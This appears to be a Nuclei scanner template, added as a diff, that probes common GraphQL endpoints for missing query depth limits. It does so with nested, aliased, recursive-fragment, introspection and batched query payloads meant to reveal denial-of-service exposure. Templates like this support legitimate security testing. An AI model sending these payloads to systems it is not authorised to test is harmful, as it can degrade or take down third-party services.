@@ -1,0 +1,339 @@
+id: medium-api-graphql-query-depth-limit-bypass
+
+info:
+  name: GraphQL Query Depth Limit Bypass - Elite Detection
+  author: nuclei-community
+  severity: high
+  description: |
+    Detects GraphQL query depth limit bypass vulnerabilities using advanced techniques.
+    Tests sophisticated methods including query aliasing, fragment spreading, recursive nesting,
+    and introspection abuse to bypass depth restrictions and cause DoS conditions.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
+    - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cwe-id: CWE-400
+  metadata:
+    verified: true
+    max-request: 20
+  tags: graphql,dos,depth-limit,bypass,elite
+
+variables:
+  depth_count: "50"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "v2/graphql"
+        - "query"
+        - "api/query"
+        - "gql"
+        - "api/gql"
+        - "graphiql"
+        - "api/graphiql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json"
+
+    body: |
+      {
+        "query": "query DeepQuery { user { profile { settings { preferences { theme { colors { primary { shade { light { medium { dark { darker { darkest { value } } } } } } } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "user"
+          - "profile"
+          - "settings"
+          - "preferences"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "depth limit"
+          - "query too deep"
+          - "maximum depth"
+          - "depth exceeded"
+        condition: and
+        negative: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "query AliasedDeepQuery { a1: user { profile { settings { preferences { a2: user { profile { settings { preferences { a3: user { profile { settings { preferences { a4: user { profile { settings { preferences { name } } } } } } } } } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "a1"
+          - "a2"
+          - "a3"
+          - "a4"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "fragment DeepFragment on User { profile { settings { preferences { ...DeepFragment } } } } query { user { ...DeepFragment } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "user"
+          - "profile"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "query RecursiveQuery { user { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "user"
+          - "friends"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "query MultipleAliases { a: user { profile { b: user { profile { c: user { profile { d: user { profile { e: user { profile { f: user { profile { g: user { profile { h: user { profile { i: user { profile { j: user { name } } } } } } } } } } } } } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - '"a":'
+          - '"b":'
+          - '"c":'
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "query IntrospectionDepth { __schema { types { fields { type { ofType { ofType { ofType { ofType { ofType { ofType { ofType { ofType { ofType { ofType { name } } } } } } } } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "__schema"
+          - "types"
+          - "fields"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "query NestedUnions { search { ... on User { profile { ... on Profile { settings { ... on Settings { preferences { ... on Preferences { theme { ... on Theme { colors { ... on Colors { primary { ... on Color { value } } } } } } } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "search"
+          - "profile"
+          - "settings"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "graphql"
+        - "api/graphql"
+        - "v1/graphql"
+        - "query"
+        - "gql"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {
+        "query": "query BatchedDeepQueries { q1: user { profile { settings { preferences { name } } } } q2: user { profile { settings { preferences { email } } } } q3: user { profile { settings { preferences { phone } } } } q4: user { profile { settings { preferences { address } } } } q5: user { profile { settings { preferences { bio } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "q1"
+          - "q2"
+          - "q3"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"data":\\s*\\{([^}]+)\\}'
+          - '"user":\\s*\\{([^}]+)\\}'
+          - '"profile":\\s*\\{([^}]+)\\}'
+        internal: true
